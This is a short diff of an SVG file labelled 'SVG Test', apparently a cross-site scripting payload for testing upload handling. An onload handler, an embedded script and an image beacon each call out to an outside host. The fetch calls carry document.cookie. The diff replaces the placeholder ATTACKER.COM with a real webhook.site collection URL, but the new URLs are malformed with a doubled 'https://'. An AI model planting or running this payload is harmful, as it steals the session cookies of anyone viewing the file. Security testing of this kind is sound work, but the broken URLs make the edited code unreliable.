@@ -1,8 +1,8 @@
 <?xml version="1.0" standalone="no"?>
-<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" onload="fetch('https://ATTACKER.COM/svg-file-onload?c='+document.cookie)">
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" onload="fetch('https://https://webhook.site/9b278ba7-478e-4d91-aeac-e4207fa53293/svg-file-onload?c='+document.cookie)">
   <script type="text/javascript">
-    fetch('https://ATTACKER.COM/svg-file-script?c='+document.cookie);
+    fetch('https://https://webhook.site/9b278ba7-478e-4d91-aeac-e4207fa53293/svg-file-script?c='+document.cookie);
   </script>
-  <image href="https://ATTACKER.COM/beacon/svg-file-image"/>
+  <image href="https://https://webhook.site/9b278ba7-478e-4d91-aeac-e4207fa53293/beacon/svg-file-image"/>
   <text x="10" y="50">SVG Test</text>
 </svg>
